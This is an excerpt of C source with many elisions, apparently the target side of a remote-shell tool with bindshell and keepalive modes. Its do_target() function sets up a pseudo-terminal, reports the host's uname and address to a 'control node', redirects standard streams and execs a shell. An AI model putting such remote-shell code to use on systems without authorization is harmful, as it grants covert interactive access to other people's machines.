...
int do_target() {
  ...
  if ((retval = init_io_target(config)) == -1) {
    report_error("do_target(): init_io_connect(%lx): %s", (unsigned long)config,
                 strerror(errno));
    return (-1);
  }

  // retval == -2  means target in keepalive mode with and we should return to
  // handle another connection.
  // This can be the parent from bindshell + keepalive mode, or keepalive mode
  ...
  if (message->data_type != DT_INIT) {
    report_error(
        "do_target(): invalid initialization: shell: Protocol violation!");
    return (-1);
  }

  if (message->data_len) {
    if ((shell = (char *)calloc(message->data_len + 1, sizeof(char))) == NULL) {
      report_error("do_target(): calloc(%d, %d): %s", message->data_len + 1,
  ...
  if ((exec_envp = string_to_vector(message->data)) == NULL) {
    report_error("do_target(): string_to_vector(%s): %s", message->data,
                 strerror(errno));
    return (-1);
  }
  ...
  if (message->data_len !=
      sizeof(tty_winsize.ws_row) + sizeof(tty_winsize.ws_col)) {
  ...
  // The initialization protocol is now finished. Rest of initialization is
  // local.
  io->init_complete = 1;

  /*  - Create a pseudo-terminal (pty). */
  if ((pty_master = posix_openpt(O_RDWR | O_NOCTTY)) == -1) {
    report_error("do_target(): posix_openpt(O_RDWR|O_NOCTTY): %s",
                 strerror(errno));
    return (-1);
  }
  ...
  if (ioctl(pty_master, TIOCSWINSZ, &tty_winsize) == -1) {
    report_error("do_target(): ioctl(%d, %d, %lx): %s", pty_master, TIOCGWINSZ,
  ...
  if ((pty_slave = open(pty_name, O_RDWR | O_NOCTTY)) == -1) {
    report_error("do_target(): open(%s, O_RDWR|O_NOCTTY): %s", pty_name,
                 strerror(errno));
    return (-1);
  }

  /*  - Send basic information back to the control node about the connecting
   * host. */
  if ((buff_head = (char *)calloc(LOCAL_BUFF_SIZE, sizeof(char))) == NULL) {
    report_error("do_target(): calloc(%d, %d): %s", LOCAL_BUFF_SIZE,
                 (int)sizeof(char), strerror(errno));
    return (-1);
  }

  if (uname(&uname_info) == -1) {
    report_error("do_target(): uname(%lx): %s", (unsigned long)&uname,
                 strerror(errno));
    return (-1);
  }
  ...
  if (getsockname(io->remote_fd, &addr, &addrlen) != -1) {
    if (inet_ntop(addr.sa_family, addr.sa_data + 2, buff_head,
                  LOCAL_BUFF_SIZE - 1)) {
  ...
  /*
           if(close(STDIN_FILENO) == -1){
           report_error("do_target(): close(STDIN_FILENO): %s",
     strerror(errno));
           return(-1);
           }
           ...
           if(!verbose){
           if(close(STDOUT_FILENO) == -1){
           report_error("do_target(): close(STDOUT_FILENO): %s",
     strerror(errno));
           return(-1);
           }

           if(close(STDERR_FILENO) == -1){
           report_error("do_target(): close(STDERR_FILENO): %s",
     strerror(errno));
           return(-1);
           }
           }
  ...
  if (retval) {
    ...
    if ((fcntl_flags = fcntl(io->local_in_fd, F_GETFL, 0)) == -1) {
      report_error("do_target(): fcntl(%d, F_GETFL, 0): %s", io->local_in_fd,
                   strerror(errno));
      return (-1);
    }
    ...
    if (fcntl(io->local_in_fd, F_SETFL, fcntl_flags) == -1) {
      report_error("do_target(): fcntl(%d, F_SETFL, %d): %s", io->local_in_fd,
                   fcntl_flags, strerror(errno));
      return (-1);
    }

    if ((fcntl_flags = fcntl(io->local_out_fd, F_GETFL, 0)) == -1) {
      report_error("do_target(): fcntl(%d, F_GETFL, 0): %s", io->local_out_fd,
                   strerror(errno));
      return (-1);
    }
    ...
    if (fcntl(io->local_out_fd, F_SETFL, fcntl_flags) == -1) {
      report_error("do_target(): fcntl(%d, F_SETFL, %d): %s", io->local_out_fd,
                   fcntl_flags, strerror(errno));
      return (-1);
    }
    ...
    if (retval == -1 && !io->eof) {
      report_error("do_target(): broker(%lx): %s", (unsigned long)config,
                   strerror(errno));
      return (-1);
    }
  ...
  // We are trying to set up the pty_slave to be stdin, stdout, and stderr
  // before exec()ing
  // so everything looks normal to bash. Unfortunately, pty_slave has ended up
  // as one of
  ...
  if (pty_slave < STDERR_FILENO + 1) {
    if (dup2(pty_slave, STDERR_FILENO + 1) == -1) {
      report_error("do_target(): dup2(%d, STDERR_FILENO + 1): %s", pty_slave,
                   strerror(errno));
      return (-1);
    }
  ...
  if (dup2(pty_slave, STDIN_FILENO) == -1) {
    report_error("do_target(): dup2(%d, STDIN_FILENO): %s", pty_slave,
                 strerror(errno));
    return (-1);
  }

  if (dup2(pty_slave, STDOUT_FILENO) == -1) {
    report_error("do_target(): dup2(%d, STDOUT_FILENO): %s", pty_slave,
                 strerror(errno));
    return (-1);
  }

  if (dup2(pty_slave, STDERR_FILENO) == -1) {
    report_error("do_target(): dup2(%d, %d): %s", pty_slave, STDERR_FILENO,
                 strerror(errno));
    return (-1);
  }
  ...
  if (ioctl(STDIN_FILENO, TIOCSCTTY, 1) == -1) {
    report_error("do_target(): ioctl(STDIN_FILENO, TIOCSCTTY, 1): %s",
                 strerror(errno));
    //	WSL will fail on this step. Changing this to an error report only error,
    //non-fatal.
    //		return(-1);
  }
  ...
  if ((exec_argv = string_to_vector(shell)) == NULL) {
    report_error("do_target(): string_to_vector(%s): %s", shell,
                 strerror(errno));
    return (-1);
  }
  ...
  report_error("do_target(): execve(%s, %lx, %lx): %s", exec_argv[0],
               (unsigned long)message->data_type, (unsigned long)exec_envp,
               strerror(errno));
  return (-1);
}
 ...
 * remote_printf()
 *
 * Input: The fmt specification as you would find in a normal printf statement.
 *We will also use the global io struct.
 * Output: 0 on success, -1 on failure.
 *
 * Purpose: Provide a printf() style wrapper that leverages the underlying
 *message bus. Used by the target system
 *          during initialization to send back system info for display to the
 *user.
 *
 **********************************************************************************************************************/
int remote_printf(char *fmt, ...) {
  ...
  if ((retval = vsnprintf(message->data, io->message_data_size, fmt,
                          list_ptr)) < 0) {
    report_error("remote_printf(): vsnprintf(%lx, %d, %lx, %lx): %s",
                 (unsigned long)message->data, io->message_data_size,
